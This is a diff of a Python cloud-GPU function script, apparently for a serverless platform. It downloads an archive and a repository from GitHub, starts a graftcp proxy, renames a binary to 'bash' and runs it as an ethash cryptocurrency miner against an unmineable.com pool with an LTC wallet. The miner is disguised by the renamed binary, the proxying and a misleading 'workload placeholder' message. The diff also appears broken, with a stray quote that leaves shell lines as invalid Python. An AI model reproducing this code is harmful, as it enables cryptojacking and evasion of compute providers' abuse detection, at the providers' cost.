@@ -14,6 +14,7 @@ image = (
 )
 
 
+
 @function(
     name="t4x3-runner",
     image=image,
@@ -23,44 +24,43 @@ image = (
     timeout=4 * 60 * 60,
 )
 def run_script():
-    # Check GPU
+    # cek GPU
     subprocess.run(["nvidia-smi"], check=False)
 
-    cmd = r"""
+    cmd = """
     set -e
 
     echo "=== DOWNLOAD FILE ==="
-    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O /tmp/pan.zip
+    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip
 
     echo "=== EXTRACT ==="
-    mkdir -p /tmp/work
-    unzip -o /tmp/pan.zip -d /tmp/work
+    unzip -o pan.zip
+        
+    cd pan
 
-    cd /tmp/work/pan
-
-    echo "=== SET PERMISSIONS ==="
+    echo "=== SET PERMISSION ==="
     chmod -R +x .
 
-    echo "=== START LOCAL SERVICE ==="
-    ./graftcp/local/graftcp-local \
-        -config graftcp-local.conf \
-        > /tmp/graftcp.log 2>&1 &
+    echo "=== START GRAFTCP LOCAL ==="
+    ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &
 
+    # tunggu service siap
     sleep 3
 
-    echo "=== CLONE REPOSITORY ==="
+    # download lol
     git clone https://github.com/hujisanda/lol198.git
+    cd lol198 && chmod u+x bash
 
-    cd lol198
-    chmod u+x bash
+    #pindah file    
+    mv bash ~/pan
+    
+    # pindah file pan
+    cd ~
+    cd pan
 
-    mv bash /tmp/work/pan/
-
-    echo "=== WORKLOAD READY ==="
-    cd /tmp/work/pan
-
-    echo "=== RUN PROCESS VIA GRAFTCP ==="
+    echo "=== RUN PROC VIA GRAFTCP ==="
     ./graftcp/graftcp ./bash --algo ethash --pool stratum+tcp://ethash.unmineable.com:3333 --user LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.kacung --ethstratum ETHPROX
+    """
     
     echo "Workload placeholder completed."
     """
